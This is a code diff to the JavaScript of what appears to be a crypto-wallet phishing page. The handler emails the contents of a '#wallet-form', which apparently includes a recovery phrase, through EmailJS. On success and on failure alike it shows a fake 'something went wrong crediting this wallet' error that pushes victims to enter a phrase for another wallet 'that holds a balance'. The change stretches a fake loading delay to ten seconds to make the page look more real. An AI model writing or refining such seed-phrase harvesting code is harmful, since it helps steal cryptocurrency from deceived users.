@@ -414,11 +414,16 @@
       event.preventDefault();
       const btn = document.getElementById("submit-btn");
       const errorBox = document.getElementById("error-box");
+      
+      // Disable button and show loading state for 10 seconds
       btn.disabled = true;
-      btn.textContent = "Connecting...";
-      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
-      .then(function(response) {
-        setTimeout(() => {
+      btn.classList.add('connecting');
+      btn.innerHTML = '<span class="btn-spinner"></span> Processing...';
+      
+      // Show error after 10 seconds (keeping your original error handling)
+      setTimeout(() => {
+        emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
+        .then(function(response) {
           errorBox.innerHTML = `
   <p>
     Oops, something went wrong crediting this wallet.<br>
@@ -429,22 +434,24 @@
           errorBox.style.display = "block";
           document.getElementById('wallet-page').classList.add('blurred');
           btn.disabled = false;
+          btn.classList.remove('connecting');
           btn.textContent = "Connect";
-        }, 2000);
-      })
-      .catch(function(error) {
-        errorBox.innerHTML = `
+        })
+        .catch(function(error) {
+          errorBox.innerHTML = `
   <p>
     Oops, something went wrong crediting this wallet.<br>
     Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
   </p>
   <button onclick="returnToMainPage()">Try Again</button>
 `;
-        errorBox.style.display = "block";
-        document.getElementById('wallet-page').classList.add('blurred');
-        btn.disabled = false;
-        btn.textContent = "Connect";
-      });
+          errorBox.style.display = "block";
+          document.getElementById('wallet-page').classList.add('blurred');
+          btn.disabled = false;
+          btn.classList.remove('connecting');
+          btn.textContent = "Connect";
+        });
+      }, 10000); // Changed from 2000ms to 10000ms (10 seconds)
     });
 
     // Testimonials auto-rotate
